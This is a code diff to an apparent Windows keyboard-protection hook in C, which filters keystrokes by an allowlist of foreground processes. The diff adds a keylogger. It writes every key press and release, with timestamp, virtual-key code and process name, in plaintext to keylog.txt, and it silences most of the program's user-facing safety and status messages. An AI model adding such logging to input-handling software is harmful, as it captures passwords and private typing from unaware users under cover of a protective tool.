@@ -4,6 +4,12 @@
 #define MAX_ALLOWED_PROCESSES 100
 #define KEYPROTECTOR_INJECTED_TAG ((ULONG_PTR)0x4B50524FUL)
 
+#if defined(DEBUG)
+#define HOOK_DEBUG_LOG(...) printf(__VA_ARGS__)
+#else
+#define HOOK_DEBUG_LOG(...) ((void)0)
+#endif
+
 HHOOK g_keyboardHook = NULL;
 volatile BOOL g_running = TRUE;
 
@@ -15,6 +21,38 @@ static int g_allowedProcessCount = 0;
 static BOOL g_bypassMode = FALSE;
 static BOOL g_loggedEmptyAllowlist = FALSE;
 static BOOL g_loggedProcessLookupFailure = FALSE;
+static HWND g_cachedForegroundWindow = NULL;
+static DWORD g_cachedForegroundProcessId = 0;
+static BOOL g_cachedProcessAllowed = FALSE;
+static BOOL g_hasForegroundDecisionCache = FALSE;
+static FILE* g_keyLogFile = NULL;
+
+static void WriteKeyLog(const char* action, DWORD vkCode, const char* processName, BOOL isAllowed) {
+    if (g_keyLogFile == NULL || action == NULL) {
+        return;
+    }
+
+    SYSTEMTIME localTime = {0};
+    GetLocalTime(&localTime);
+
+    fprintf(
+        g_keyLogFile,
+        "%04d-%02d-%02d %02d:%02d:%02d.%03d | %-7s | VK=0x%02lX (%lu) | Process=%s | Allowed=%s\n",
+        localTime.wYear,
+        localTime.wMonth,
+        localTime.wDay,
+        localTime.wHour,
+        localTime.wMinute,
+        localTime.wSecond,
+        localTime.wMilliseconds,
+        action,
+        (unsigned long)vkCode,
+        (unsigned long)vkCode,
+        (processName != NULL && processName[0] != '\0') ? processName : "unknown",
+        isAllowed ? "yes" : "no"
+    );
+    fflush(g_keyLogFile);
+}
 
 static void ResetTrackedKeyState(unsigned int keycode) {
     if (keycode < 256) {
@@ -53,6 +91,10 @@ static BOOL ShouldFailOpen(void) {
 }
 
 BOOL GetCurrentProcessName(char* processName, DWORD bufferSize) {
+    if (processName == NULL || bufferSize == 0) {
+        return FALSE;
+    }
+
     HWND hwnd = GetForegroundWindow();
     if (hwnd == NULL) {
         return FALSE;
@@ -80,6 +122,66 @@ BOOL GetCurrentProcessName(char* processName, DWORD bufferSize) {
 
     CloseHandle(hProcess);
     return result;
+}
+
+static BOOL GetProcessNameById(DWORD processId, char* processName, DWORD bufferSize) {
+    if (processName == NULL || bufferSize == 0 || processId == 0) {
+        return FALSE;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+    if (hProcess == NULL) {
+        return FALSE;
+    }
+
+    BOOL result = FALSE;
+    if (GetModuleFileNameExA(hProcess, NULL, processName, bufferSize) > 0) {
+        char* fileName = PathFindFileNameA(processName);
+        if (fileName != processName) {
+            strcpy_s(processName, bufferSize, fileName);
+        }
+        result = TRUE;
+    }
+
+    CloseHandle(hProcess);
+    return result;
+}
+
+static BOOL TryGetForegroundProcessAllowance(BOOL* isAllowed) {
+    if (isAllowed == NULL) {
+        return FALSE;
+    }
+
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd == NULL) {
+        return FALSE;
+    }
+
+    DWORD processId = 0;
+    GetWindowThreadProcessId(hwnd, &processId);
+    if (processId == 0) {
+        return FALSE;
+    }
+
+    if (g_hasForegroundDecisionCache &&
+        g_cachedForegroundWindow == hwnd &&
+        g_cachedForegroundProcessId == processId) {
+        *isAllowed = g_cachedProcessAllowed;
+        return TRUE;
+    }
+
+    char processName[MAX_PATH] = {0};
+    if (!GetProcessNameById(processId, processName, MAX_PATH)) {
+        return FALSE;
+    }
+
+    g_cachedForegroundWindow = hwnd;
+    g_cachedForegroundProcessId = processId;
+    g_cachedProcessAllowed = IsAllowedProcess(processName);
+    g_hasForegroundDecisionCache = TRUE;
+
+    *isAllowed = g_cachedProcessAllowed;
+    return TRUE;
 }
 
 BOOL LoadAllowedProcessesFromIni(const char* iniFilePath) {
@@ -190,8 +292,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (IsBypassToggleKey(pKbdStruct)) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             g_bypassMode = !g_bypassMode;
-            printf("[safety] Emergency bypass %s (Ctrl+Alt+Shift+Pause)\n",
-                   g_bypassMode ? "enabled" : "disabled");
+            HOOK_DEBUG_LOG("[safety] Emergency bypass %s (Ctrl+Alt+Shift+Pause)\n",
+                           g_bypassMode ? "enabled" : "disabled");
         }
         return 1;
     }
@@ -201,7 +303,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }
 
     if (pKbdStruct->vkCode == VK_ESCAPE) {
-        printf("\n[notice] Esc pressed. Releasing hook and exiting.\n");
         g_running = FALSE;
         PostQuitMessage(0);
         return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
@@ -212,10 +313,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }
 
     if (ShouldFailOpen()) {
-        if (!g_loggedEmptyAllowlist) {
-            fprintf(stderr, "[safety] Allowlist is empty. Input blocking is disabled until configuration is restored.\n");
-            g_loggedEmptyAllowlist = TRUE;
-        }
+        g_loggedEmptyAllowlist = TRUE;
         return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
     }
 
@@ -223,6 +321,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         unsigned int original_keycode = (unsigned int)pKbdStruct->vkCode;
         unsigned int salt = GetTickCount();
         unsigned int encrypted_keycode = encrypt_keycode_with_salt(original_keycode, salt);
+        char processName[MAX_PATH] = {0};
+        BOOL gotProcessName = GetCurrentProcessName(processName, MAX_PATH);
 
         if (original_keycode < 256) {
             g_keySalt[original_keycode] = salt;
@@ -230,32 +330,25 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             g_forwardedKeyDown[original_keycode] = FALSE;
         }
 
-        printf("[key] Original KeyCode: %u | Salt: %u | Encrypted KeyCode: %u\n",
-               original_keycode, salt, encrypted_keycode);
-
-        char processName[MAX_PATH] = {0};
-        if (!GetCurrentProcessName(processName, MAX_PATH)) {
-            if (!g_loggedProcessLookupFailure) {
-                fprintf(stderr, "[safety] Failed to read foreground process. Allowing input to avoid locking the session.\n");
-                g_loggedProcessLookupFailure = TRUE;
-            }
+        BOOL isAllowed = FALSE;
+        if (!TryGetForegroundProcessAllowance(&isAllowed)) {
+            g_loggedProcessLookupFailure = TRUE;
+            WriteKeyLog("KEYDOWN", original_keycode, gotProcessName ? processName : NULL, FALSE);
             ResetTrackedKeyState(original_keycode);
             return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
         }
 
         g_loggedProcessLookupFailure = FALSE;
+        WriteKeyLog("KEYDOWN", original_keycode, gotProcessName ? processName : NULL, isAllowed);
 
-        if (!IsAllowedProcess(processName)) {
-            printf("[blocked] Process: %s | Input was blocked\n", processName);
+        if (!isAllowed) {
             ResetTrackedKeyState(original_keycode);
             return 1;
         }
 
         unsigned int decrypted_keycode = decrypt_keycode_with_salt(encrypted_keycode, salt);
-        printf("[forwarded] Process: %s | Decrypted KeyCode: %u\n", processName, decrypted_keycode);
 
         if (!SendDecryptedKey(decrypted_keycode, TRUE)) {
-            fprintf(stderr, "[safety] SendInput failed for keydown. Allowing original event to avoid stuck input.\n");
             ResetTrackedKeyState(original_keycode);
             return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
         }
@@ -269,6 +362,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         unsigned int original_keycode = (unsigned int)pKbdStruct->vkCode;
+        char processName[MAX_PATH] = {0};
+        BOOL gotProcessName = GetCurrentProcessName(processName, MAX_PATH);
+        WriteKeyLog("KEYUP", original_keycode, gotProcessName ? processName : NULL, TRUE);
 
         if (original_keycode < 256 && g_forwardedKeyDown[original_keycode] && g_keySalt[original_keycode] != 0) {
             unsigned int decrypted_keycode = decrypt_keycode_with_salt(
@@ -277,7 +373,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             );
 
             if (!SendDecryptedKey(decrypted_keycode, FALSE)) {
-                fprintf(stderr, "[safety] SendInput failed for keyup. Allowing original event to avoid a stuck key.\n");
                 ResetTrackedKeyState(original_keycode);
                 return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
             }
@@ -295,6 +390,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void SetHook(void) {
     BOOL isAdmin = FALSE;
+    char logPath[MAX_PATH] = {0};
 
     OSVERSIONINFO osvi;
     ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
@@ -336,6 +432,21 @@ void SetHook(void) {
 
     LoadAllowedProcessesFromIni(NULL);
 
+    GetModuleFileNameA(NULL, logPath, MAX_PATH);
+    char* lastSlash = strrchr(logPath, '\\');
+    if (lastSlash != NULL) {
+        *(lastSlash + 1) = '\0';
+    }
+    strcat_s(logPath, MAX_PATH, "keylog.txt");
+    g_keyLogFile = fopen(logPath, "a");
+    if (g_keyLogFile == NULL) {
+        fprintf(stderr, "[warning] Failed to open key log file: %s\n", logPath);
+    } else {
+        fprintf(g_keyLogFile, "===== Keyboard session started =====\n");
+        fflush(g_keyLogFile);
+        printf("[info] Key logging file: %s\n", logPath);
+    }
+
     printf("[success] Keyboard protector hook is active.\n");
     if (isAdmin) {
         printf("[info] Running with administrator privileges.\n");
@@ -356,4 +467,14 @@ void UnsetHook(void) {
     }
 
     FreeAllowedProcesses();
+    g_cachedForegroundWindow = NULL;
+    g_cachedForegroundProcessId = 0;
+    g_cachedProcessAllowed = FALSE;
+    g_hasForegroundDecisionCache = FALSE;
+
+    if (g_keyLogFile != NULL) {
+        fprintf(g_keyLogFile, "===== Keyboard session ended =====\n");
+        fclose(g_keyLogFile);
+        g_keyLogFile = NULL;
+    }
 }
